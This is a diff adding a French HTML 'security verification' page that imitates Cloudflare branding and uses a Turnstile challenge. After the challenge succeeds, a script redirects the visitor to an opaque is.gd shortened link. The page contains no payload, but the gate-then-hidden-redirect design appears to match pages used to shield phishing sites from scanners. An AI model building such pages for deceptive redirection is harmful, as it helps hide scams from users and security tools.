@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vérification de sécurité</title>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    background: #f6f7f8;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1f2937;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    padding: 24px;
+}
+
+.card {
+    background: #ffffff;
+    border: 1px solid #e5e7eb;
+    border-radius: 6px;
+    padding: 28px;
+    text-align: center;
+}
+
+.logo {
+    margin-bottom: 16px;
+}
+
+
+h1 {
+    font-size: 20px;
+    font-weight: 600;
+    margin: 0 0 8px;
+}
+
+p {
+    font-size: 14px;
+    color: #4b5563;
+    margin-bottom: 20px;
+}
+
+.footer {
+    margin-top: 16px;
+    font-size: 12px;
+    color: #9ca3af;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+    <div class="card">
+
+
+        <h1>Vérification de sécurité</h1>
+        <p>Veuillez confirmer que vous êtes un humain pour continuer.</p>
+
+        <div class="cf-turnstile"
+             data-sitekey="0x4AAAAAACJt2hryQedcfI3X"
+             data-callback="onSuccess">
+        </div>
+
+        <div class="footer">
+            Performance &amp; sécurité par Cloudflare
+        </div>
+    </div>
+</div>
+
+<script>
+function onSuccess(token) {
+  fetch("/verify", {
+    method: "POST",
+    body: new URLSearchParams({
+      "cf-turnstile-response": token
+    })
+  }).then(res => {
+    if (res.ok) {
+      window.location.href = "https://is.gd/T6K9zz";
+    } else {
+      alert("Échec de la vérification");
+    }
+  });
+}
+</script>
+</body>
+</html>
